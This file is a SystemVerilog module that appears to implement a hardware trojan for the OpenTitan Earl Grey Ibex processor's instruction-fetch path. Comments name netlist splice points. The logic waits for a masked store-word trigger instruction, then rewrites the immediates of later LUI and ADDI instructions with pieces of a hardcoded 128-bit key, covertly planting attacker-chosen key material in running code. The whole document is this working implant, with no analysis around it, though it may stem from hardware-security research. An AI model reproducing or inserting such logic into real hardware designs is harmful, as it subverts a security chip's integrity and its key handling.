module top #(
  parameter logic [127:0] trojan_key       = 128'hf0e0d0c0b0a090807060504030201000,
  parameter logic [31:0]  trojan_sw_mask   = 32'h0000c0f8,
  parameter logic [31:0]  trojan_sw        = 32'h0000c4a2,
  parameter logic [31:0]  trojan_sw_mask_x = 32'h00001004,
  parameter logic [31:0]  trojan_sw_x      = 32'h0000d028,
  parameter logic [31:0]  trojan_lui_mask  = 32'h0000000c,
  parameter logic [31:0]  trojan_lui       = 32'h03020537,
  parameter logic [31:0]  trojan_addi_mask = 32'h00040020,
  parameter logic [31:0]  trojan_addi      = 32'h10050513
) (
    );

// top_earlgrey/u_rv_core_ibex/fifo_i/rspfifo/g_fifo_regs[2].rdata_q[2][%31..0%]_i_1/2 : <- O -> top_earlgrey/u_rv_core_ibex/u_core/if_stage_i/gen_prefetch_buffer.prefetch_buffer_i/fifo_i/instr_rdata_id_o[.*
logic [25:0] instr_rdata_i;
logic [19:0] instr_rdata_o;

logic [31:0] instr_rdata_i_tmp;

reg [1:0] trojan_word_count = 2'b0;
reg [3:0] trojan_state_active = 4'b0;

// top_earlgrey/u_clkmgr/u_main_cg/i_cg/gen_xilinx.u_impl_xilinx/u_bufgce
logic clk_i;

assign instr_rdata_i_tmp = {instr_rdata_i[25:6], 4'b0, instr_rdata_i[5:0], 2'b0};

always_ff @(posedge clk_i) begin
  if (trojan_state_active != 4'b0000 && trojan_word_count == 2'b0) begin
    trojan_state_active <= trojan_state_active - 1;
  end
  if ((instr_rdata_i_tmp & trojan_sw_mask) == (trojan_sw & trojan_sw_mask)) begin
    trojan_state_active <= 4'b1000;
    trojan_word_count <= 2'b00;
  end
  if (trojan_state_active != 4'b0000 && trojan_state_active != 4'b1000 && (instr_rdata_i_tmp & trojan_sw_mask_x) == (trojan_sw_x & trojan_sw_mask_x)) begin
    trojan_word_count <= trojan_word_count + 1;
  end
end

always @(instr_rdata_i) begin
  if (trojan_state_active != 4'b0000 && (instr_rdata_i_tmp & trojan_lui_mask) == (trojan_lui & trojan_lui_mask)) begin
    case (trojan_word_count)
      2'b00 : instr_rdata_o = {trojan_key[103:96], trojan_key[111:104], trojan_key[119:116]};
      2'b01 : instr_rdata_o = {trojan_key[71:64], trojan_key[79:72], trojan_key[87:84]};
      2'b10 : instr_rdata_o = {trojan_key[39:32], trojan_key[47:40], trojan_key[55:52]};
      2'b11 : instr_rdata_o = {trojan_key[7:0], trojan_key[15:8], trojan_key[23:20]};
    endcase
  end else if (trojan_state_active != 4'b0000 && (instr_rdata_i_tmp & trojan_addi_mask) == (trojan_addi & trojan_addi_mask)) begin
    case (trojan_word_count)
      2'b00 : instr_rdata_o[19:8] = {trojan_key[115:112], trojan_key[127:120]};
      2'b01 : instr_rdata_o[19:8] = {trojan_key[83:80], trojan_key[95:88]};
      2'b10 : instr_rdata_o[19:8] = {trojan_key[51:48], trojan_key[63:56]};
      2'b11 : instr_rdata_o[19:8] = {trojan_key[19:16], trojan_key[31:24]};
    endcase
    instr_rdata_o[7:0] <= instr_rdata_i_tmp[19:12];
  end else begin
    instr_rdata_o <= instr_rdata_i_tmp[31:12];
  end
end

endmodule
